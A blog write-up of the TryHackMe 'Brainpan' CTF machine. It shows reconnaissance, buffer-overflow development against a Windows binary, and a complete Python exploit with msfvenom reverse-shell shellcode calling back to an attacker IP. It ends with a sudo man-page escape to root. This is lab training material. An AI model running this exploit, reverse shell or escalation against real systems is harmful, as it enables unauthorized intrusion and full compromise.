---
layout: post
title:  "Brainpan (THM)"
date:   2025-08-01 20:48:43 -0400
author: robo.uzi
tags: [CTF, TryHackMe]
---

Prompt: Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don't give up (or look at writeups), just try harder. 

## Exploiting

I run `nmap -sVC -T5 -vv 10.10.28.22 -oN brainpanfull.txt`:
```shell
PORT      STATE SERVICE REASON  VERSION  
9999/tcp  open  abyss?  syn-ack  
| fingerprint-strings:    
|   NULL:    
|     [________________________ WELCOME TO BRAINPAN _________________________]  
|_    ENTER THE PASSWORD  
10000/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 2.7.3)  
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
```

I connect `nc 10.10.28.22 9999` to see what that server does. I get this:
```shell
nc 10.10.28.22 9999  
_|                            _|                                           
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|     
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|  
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|  
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|  
                                           _|                             
                                           _|  
  
[________________________ WELCOME TO BRAINPAN _________________________]  
                         ENTER THE PASSWORD                                 
  
                         >> password  
                         ACCESS DENIED
```

I run `gobuster dir -u http://10.10.28.22:10000/ -w /usr/share/wordlists/dirb/common.txt -t 50` and find a directory called `/bin` which contained `brainpan.exe`:
```shell
file brainpan.exe  
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 5 sections
```

I transfer it to my windows machine and open it in immunity debugger. I connect to it to see it works: `nc 192.168.126.130 9999`. It takes your input for the password and copies the bytes into a buffer.

I test how many characters it will take to crash the server like this: `python3 -c 'print("A"*100)' | nc 192.168.126.130 9999`. It crashes after `600`.

I run `msf-pattern_create -l 1000` to generate a cyclic pattern of a length 400 bytes longer than the string that crashed the server.

I run 
```shell
echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" | nc 192.168.126.130 9999
```
Now I can run `msf-pattern_offset -l 1000 -q 35724134` to get the exact offset. Here `35724134` is the value of the `EIP` register.

Now check for bad characters. Set a working directory for mona in immunity debugger like this: `!mona config -set workingfolder c:\mona\%p`.

Generate a byte array excluding the null byte by default using `mona` like this: `!mona bytearray -b "\x00"`. 

After I crash the server again I can run `!mona compare -f C:\mona\gatekeeper\bytearray.bin -a esp` to check which characters are bad. I find only `\x00` is a bad char which it always is.

To find a jump point I run `!mona jmp -r esp -cpb \x00` and get a memory address at `0x311712f3`. 

Now add NOPs and shellcode. To generate the shellcode I run `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.13.66.123 LPORT=4444 -b "\x00" -f py -v shellcode`

Here is my final exploit script:
```python
#!/bin/python
import sys
import socket
import struct

def p32(data):
  return struct.pack('<I',data)
  
# bad_char=b"\x00"

offset=524
jmp_esp=p32(0x311712f3)
nop_sled=b"\x90"*16
buffer= b"A" * offset + b"BBBB"

shellcode =  b""
shellcode += b"\xb8\x3f\xbd\x2b\xe4\xda\xda\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x12\x31\x43\x12\x83\xeb\xfc"
shellcode += b"\x03\x7c\xb3\xc9\x11\xb3\x10\xfa\x39\xe0\xe5"
shellcode += b"\x56\xd4\x04\x63\xb9\x98\x6e\xbe\xba\x4a\x37"
shellcode += b"\xf0\x84\xa1\x47\xb9\x83\xc0\x2f\x30\x79\x71"
shellcode += b"\xd4\x2c\x83\x75\x3b\xf1\x0a\x94\x8b\x6f\x5d"
shellcode += b"\x06\xb8\xdc\x5e\x21\xdf\xee\xe1\x63\x77\x9f"
shellcode += b"\xce\xf0\xef\x37\x3e\xd8\x8d\xae\xc9\xc5\x03"
shellcode += b"\x62\x43\xe8\x13\x8f\x9e\x6b"

buffer = b"A" * offset + jmp_esp + nop_sled + shellcode

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("10.10.81.222",9999))
  s.send((buffer + b"\r\n"))
  s.close()
except:
  print("error")
  sys.exit()
```

In `msfconsole` run `set exploit/multi/handler`, `set payload linux/x86/shell_reverse_tcp`, `set LHOST 10.13.66.123`, and `exploit`.

___

## Priv Esc

Running `sudo -l` I see: 
```shell
Matching Defaults entries for puck on this host:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User puck may run the following commands on this host:  
   (root) NOPASSWD: /home/anansi/bin/anansi_util
```

Running `sudo /home/anansi/bin/anansi_util` I see:
```shell
Usage: /home/anansi/bin/anansi_util [action]  
Where [action] is one of:  
 - network  
 - proclist  
 - manual [command]
```

I go to https://gtfobins.github.io/gtfobins/man/ and see I can run `sudo man man`, then `!/bin/sh`.

I try the exploit and see this:
```shell
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man  
sudo /home/anansi/bin/anansi_util manual man  
No manual entry for manual  
WARNING: terminal is not fully functional  
-  (press RETURN)!/bin/bash  
!/bin/bash  
root@brainpan:/usr/share/man# whoami    
whoami  
root  
root@brainpan:/usr/share/man#
```
Done! I am root.

___
